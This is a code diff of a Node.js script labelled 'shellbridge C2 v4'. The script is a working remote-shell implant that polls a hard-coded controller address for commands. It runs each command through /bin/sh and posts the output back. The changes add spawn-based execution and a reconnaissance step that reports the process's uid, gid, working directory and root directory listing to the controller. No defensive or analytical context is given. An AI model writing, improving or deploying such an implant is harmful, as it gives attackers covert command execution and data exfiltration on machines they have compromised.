@@ -1,36 +1,40 @@
-// sbtv2 C2 v2 (ES5, Node 4.4.3) — con reporte de errores y fallbacks
+// shellbridge C2 v4 — spawn con pipes + diagnosticos node puro (ES5)
 var http = require('http');
 var cp = require('child_process');
+var fs = require('fs');
 
 var HOST = '192.168.1.55';
 var CMDPORT = 8000;
 var OUTPORT = 4446;
 
-function post(body) {
+function post(b) {
     try {
-        var req = http.request({ host: HOST, port: OUTPORT, method: 'POST', path: '/r' }, function () {});
-        req.on('error', function () {});
-        req.write(body || '');
-        req.end();
+        var r = http.request({ host: HOST, port: OUTPORT, method: 'POST', path: '/r' }, function () {});
+        r.on('error', function () {});
+        r.write(b || '');
+        r.end();
     } catch (e) {}
 }
+function gb(p) {
+    try { http.get('http://' + HOST + ':8000/' + p, function () {}).on('error', function () {}); } catch (e) {}
+}
+
+post('V4?start node=' + process.version);
+try { post('V4?uid=' + process.getuid() + ' gid=' + process.getgid()); } catch (e) { post('V4?uidERR=' + e.message); }
+try { post('V4?cwd=' + process.cwd()); } catch (e) {}
+try { post('V4?root=' + fs.readdirSync('/').join(',')); } catch (e) { post('V4?fsERR=' + e.message); }
+gb('v4?alive');
 
 function run(cmd) {
-    var done = false;
-    function fin(tag, err, so, se) {
-        if (done) return;
-        done = true;
-        post('[' + tag + ']' + (err ? ' ERR:' + err.message : '') + '\n' + (so || '') + (se || ''));
-    }
-    try {
-        cp.exec(cmd, function (e, so, se) { fin('exec', e, so, se); });
-    } catch (e1) {
-        try {
-            cp.execFile('/bin/sh', ['-c', cmd], function (e, so, se) { fin('execFile', e, so, se); });
-        } catch (e2) {
-            fin('both', e2, '', '');
-        }
-    }
+    var out = '';
+    var err = '';
+    var sh;
+    try { sh = cp.spawn('/bin/sh', ['-c', cmd]); }
+    catch (e) { post('V4?spawnEX=' + e.message); return; }
+    sh.stdout.on('data', function (d) { out += d; });
+    sh.stderr.on('data', function (d) { err += d; });
+    sh.on('error', function (e) { post('V4?spawnERR=' + e.message); });
+    sh.on('exit', function (c) { post('V4?code=' + c + '\n' + out + err); });
 }
 
 function tick() {
@@ -39,14 +43,9 @@ function tick() {
         res.setEncoding('utf8');
         res.on('data', function (c) { body += c; });
         res.on('end', function () {
-            body = body || '';
-            if (body.trim().length > 0) { run(body); }
-            setTimeout(tick, 2500);
+            if ((body || '').trim().length > 0) { run(body); }
+            setTimeout(tick, 3000);
         });
-    }).on('error', function () {
-        setTimeout(tick, 5000);
-    });
+    }).on('error', function () { setTimeout(tick, 6000); });
 }
-
-post('c2v2?start');
 tick();
